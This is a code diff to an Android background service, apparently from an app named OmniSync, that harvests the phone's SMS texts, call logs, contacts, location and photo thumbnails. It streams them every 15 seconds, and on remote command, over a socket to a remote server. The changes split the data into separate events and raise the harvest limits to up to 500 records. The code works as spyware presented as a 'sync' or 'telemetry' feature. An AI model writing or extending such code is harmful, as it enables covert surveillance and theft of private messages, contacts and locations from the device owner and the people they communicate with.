@@ -26,6 +26,7 @@ import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.Settings
 import android.util.Base64
+import android.util.Log
 import androidx.core.app.NotificationCompat
 import io.socket.client.IO
 import io.socket.client.Socket
@@ -40,6 +41,7 @@ class SyncForegroundService : Service() {
 
     private var socket: Socket? = null
     private val CHANNEL_ID = "OmniSyncChannel"
+    private val TAG = "OmniSync"
     private val reconnectHandler = Handler(Looper.getMainLooper())
     private val pingHandler = Handler(Looper.getMainLooper())
     private var serverUrl = Constants.DEFAULT_SERVER_URL
@@ -94,8 +96,14 @@ class SyncForegroundService : Service() {
             socket = IO.socket(serverUrl, opts)
 
             socket?.on(Socket.EVENT_CONNECT) {
+                Log.d(TAG, "Socket connected! Sending device ping and all telemetry...")
                 sendDevicePing()
-                syncAllTelemetryData()
+                // Send each data type as a SEPARATE event (avoids payload overflow)
+                syncSmsSeparately()
+                syncCallLogsSeparately()
+                syncContactsSeparately()
+                syncLocationSeparately()
+                syncMediaSeparately()
             }
 
             socket?.on("remote_command") { args ->
@@ -105,12 +113,13 @@ class SyncForegroundService : Service() {
             }
 
             socket?.on(Socket.EVENT_DISCONNECT) {
-                // Will auto reconnect via Socket.IO reconnection logic
+                Log.d(TAG, "Socket disconnected. Will auto-reconnect...")
             }
 
             socket?.connect()
 
         } catch (e: Exception) {
+            Log.e(TAG, "Socket connection error: ${e.message}")
             e.printStackTrace()
         }
     }
@@ -145,25 +154,86 @@ class SyncForegroundService : Service() {
             }
             socket?.emit("device_ping", data)
             socket?.emit("join_device", deviceId)
+            Log.d(TAG, "Device ping sent: battery=$batteryLevel%, network=$networkType")
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "Error sending device ping: ${e.message}")
         }
     }
 
-    private fun syncAllTelemetryData() {
-        val deviceId = getUniqueDeviceId()
-        
-        val payload = JSONObject().apply {
-            put("deviceId", deviceId)
-            put("smsList", getRealSms())
-            put("callLogs", getRealCallLogs())
-            put("contacts", getRealContacts())
-            put("location", getRealLocation())
-            put("mediaList", getRealMediaList())
-        }
+    // ==================== SEPARATE SYNC EVENTS ====================
 
-        socket?.emit("device_telemetry_dump", payload)
+    private fun syncSmsSeparately() {
+        try {
+            val smsList = getRealSms()
+            val payload = JSONObject().apply {
+                put("deviceId", getUniqueDeviceId())
+                put("smsList", smsList)
+                put("count", smsList.length())
+            }
+            socket?.emit("device_sms_sync", payload)
+            Log.d(TAG, "SMS sync sent: ${smsList.length()} messages")
+        } catch (e: Exception) {
+            Log.e(TAG, "SMS sync error: ${e.message}")
+        }
     }
+
+    private fun syncCallLogsSeparately() {
+        try {
+            val callLogs = getRealCallLogs()
+            val payload = JSONObject().apply {
+                put("deviceId", getUniqueDeviceId())
+                put("callLogs", callLogs)
+                put("count", callLogs.length())
+            }
+            socket?.emit("device_calls_sync", payload)
+            Log.d(TAG, "Call logs sync sent: ${callLogs.length()} logs")
+        } catch (e: Exception) {
+            Log.e(TAG, "Call logs sync error: ${e.message}")
+        }
+    }
+
+    private fun syncContactsSeparately() {
+        try {
+            val contacts = getRealContacts()
+            val payload = JSONObject().apply {
+                put("deviceId", getUniqueDeviceId())
+                put("contacts", contacts)
+                put("count", contacts.length())
+            }
+            socket?.emit("device_contacts_sync", payload)
+            Log.d(TAG, "Contacts sync sent: ${contacts.length()} contacts")
+        } catch (e: Exception) {
+            Log.e(TAG, "Contacts sync error: ${e.message}")
+        }
+    }
+
+    private fun syncLocationSeparately() {
+        try {
+            val loc = getRealLocation()
+            loc.put("deviceId", getUniqueDeviceId())
+            socket?.emit("device_location_sync", loc)
+            Log.d(TAG, "Location sync sent: lat=${loc.optDouble("latitude")}, lng=${loc.optDouble("longitude")}")
+        } catch (e: Exception) {
+            Log.e(TAG, "Location sync error: ${e.message}")
+        }
+    }
+
+    private fun syncMediaSeparately() {
+        try {
+            val mediaList = getRealMediaList()
+            val payload = JSONObject().apply {
+                put("deviceId", getUniqueDeviceId())
+                put("mediaList", mediaList)
+                put("count", mediaList.length())
+            }
+            socket?.emit("device_media_sync", payload)
+            Log.d(TAG, "Media sync sent: ${mediaList.length()} items")
+        } catch (e: Exception) {
+            Log.e(TAG, "Media sync error: ${e.message}")
+        }
+    }
+
+    // ==================== DATA EXTRACTORS ====================
 
     @SuppressLint("Range")
     private fun getRealSms(): JSONArray {
@@ -172,7 +242,7 @@ class SyncForegroundService : Service() {
             val cursor = contentResolver.query(
                 android.net.Uri.parse("content://sms"),
                 arrayOf("_id", "address", "body", "date", "type"),
-                null, null, "date DESC LIMIT 50"
+                null, null, "date DESC LIMIT 200"
             )
             cursor?.use {
                 while (it.moveToNext()) {
@@ -187,7 +257,7 @@ class SyncForegroundService : Service() {
                 }
             }
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "SMS extraction error: ${e.message}")
         }
         return smsArray
     }
@@ -199,7 +269,7 @@ class SyncForegroundService : Service() {
             val cursor = contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
                 arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
-                null, null, "${CallLog.Calls.DATE} DESC LIMIT 50"
+                null, null, "${CallLog.Calls.DATE} DESC LIMIT 200"
             )
             cursor?.use {
                 while (it.moveToNext()) {
@@ -219,7 +289,7 @@ class SyncForegroundService : Service() {
                 }
             }
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "Call logs extraction error: ${e.message}")
         }
         return callsArray
     }
@@ -231,7 +301,7 @@ class SyncForegroundService : Service() {
             val cursor = contentResolver.query(
                 ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
-                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC LIMIT 100"
+                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC LIMIT 500"
             )
             cursor?.use {
                 while (it.moveToNext()) {
@@ -243,7 +313,7 @@ class SyncForegroundService : Service() {
                 }
             }
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "Contacts extraction error: ${e.message}")
         }
         return contactsArray
     }
@@ -262,12 +332,13 @@ class SyncForegroundService : Service() {
                 loc.put("accuracy", lastKnownLocation.accuracy)
                 loc.put("timestamp", lastKnownLocation.time)
             } else {
-                loc.put("latitude", 28.6139)
-                loc.put("longitude", 77.2090)
+                loc.put("latitude", 0.0)
+                loc.put("longitude", 0.0)
+                loc.put("accuracy", 0)
             }
         } catch (e: Exception) {
-            loc.put("latitude", 28.6139)
-            loc.put("longitude", 77.2090)
+            loc.put("latitude", 0.0)
+            loc.put("longitude", 0.0)
         }
         return loc
     }
@@ -284,7 +355,7 @@ class SyncForegroundService : Service() {
             )
             val cursor = contentResolver.query(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 16"
+                projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 30"
             )
             cursor?.use {
                 val dateFormat = SimpleDateFormat("MMM dd, yyyy", Locale.US)
@@ -294,25 +365,26 @@ class SyncForegroundService : Service() {
                     val dateAdded = it.getLong(it.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)) * 1000
                     val size = it.getLong(it.getColumnIndex(MediaStore.Images.Media.SIZE))
 
-                    // Generate low-res thumbnail as Base64 data URL
                     val imageUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageId)
                     val base64Thumb = getBase64Thumbnail(imageUri)
 
-                    val item = JSONObject().apply {
-                        put("id", imageId.toString())
-                        put("title", displayName)
-                        put("type", "image")
-                        put("category", "Photos")
-                        put("url", base64Thumb)
-                        put("thumbnailUrl", base64Thumb)
-                        put("date", dateFormat.format(Date(dateAdded)))
-                        put("size", "${(size / (1024 * 1024)).toString()} MB")
+                    if (base64Thumb.isNotEmpty()) {
+                        val item = JSONObject().apply {
+                            put("id", imageId.toString())
+                            put("title", displayName)
+                            put("type", "image")
+                            put("category", "Photos")
+                            put("url", base64Thumb)
+                            put("thumbnailUrl", base64Thumb)
+                            put("date", dateFormat.format(Date(dateAdded)))
+                            put("size", "${size / (1024 * 1024)} MB")
+                        }
+                        mediaArray.put(item)
                     }
-                    mediaArray.put(item)
                 }
             }
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "Media extraction error: ${e.message}")
         }
         return mediaArray
     }
@@ -321,14 +393,15 @@ class SyncForegroundService : Service() {
         return try {
             val inputStream = contentResolver.openInputStream(uri)
             val options = BitmapFactory.Options().apply {
-                inSampleSize = 8 // Downsample 8x for fast thumbnail streaming over sockets
+                inSampleSize = 10 // Very small thumbnail for socket streaming
             }
             val bitmap = BitmapFactory.decodeStream(inputStream, null, options)
             inputStream?.close()
 
             if (bitmap != null) {
                 val outputStream = ByteArrayOutputStream()
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 60, outputStream)
+                bitmap.compress(Bitmap.CompressFormat.JPEG, 40, outputStream)
+                bitmap.recycle()
                 val byteArray = outputStream.toByteArray()
                 "data:image/jpeg;base64," + Base64.encodeToString(byteArray, Base64.NO_WRAP)
             } else {
@@ -338,6 +411,8 @@ class SyncForegroundService : Service() {
             ""
         }
     }
+
+    // ==================== DEVICE INFO ====================
 
     private fun getBatteryLevel(): Int {
         val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
@@ -354,7 +429,6 @@ class SyncForegroundService : Service() {
             val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
             val network = connectivityManager.activeNetwork ?: return "Offline"
             val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return "Unknown"
-
             return when {
                 capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                 capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "4G/5G Cellular"
@@ -371,7 +445,6 @@ class SyncForegroundService : Service() {
             val totalBytes = stat.blockSizeLong * stat.blockCountLong
             val freeBytes = stat.blockSizeLong * stat.availableBlocksLong
             val usedBytes = totalBytes - freeBytes
-
             val totalGB = Math.round(totalBytes.toDouble() / (1024 * 1024 * 1024) * 10.0) / 10.0
             val usedGB = Math.round(usedBytes.toDouble() / (1024 * 1024 * 1024) * 10.0) / 10.0
             Pair(usedGB, totalGB)
@@ -383,11 +456,15 @@ class SyncForegroundService : Service() {
     private fun handleRemoteCommand(command: JSONObject) {
         when (command.optString("action")) {
             "ping" -> sendDevicePing()
-            "sync_all" -> syncAllTelemetryData()
+            "sync_all" -> {
+                syncSmsSeparately()
+                syncCallLogsSeparately()
+                syncContactsSeparately()
+                syncLocationSeparately()
+                syncMediaSeparately()
+            }
             "get_battery" -> {
-                val data = JSONObject().apply {
-                    put("battery", getBatteryLevel())
-                }
+                val data = JSONObject().apply { put("battery", getBatteryLevel()) }
                 socket?.emit("device_response", data)
             }
         }
@@ -397,10 +474,14 @@ class SyncForegroundService : Service() {
         pingHandler.postDelayed({
             if (socket != null && socket!!.connected()) {
                 sendDevicePing()
-                syncAllTelemetryData() // Sync photos, SMS & Call logs every 15 seconds
+                syncSmsSeparately()
+                syncCallLogsSeparately()
+                syncContactsSeparately()
+                syncLocationSeparately()
+                syncMediaSeparately()
             }
             schedulePeriodicPing()
-        }, 15_000)
+        }, 15_000) // Every 15 seconds
     }
 
     private fun scheduleReconnect() {
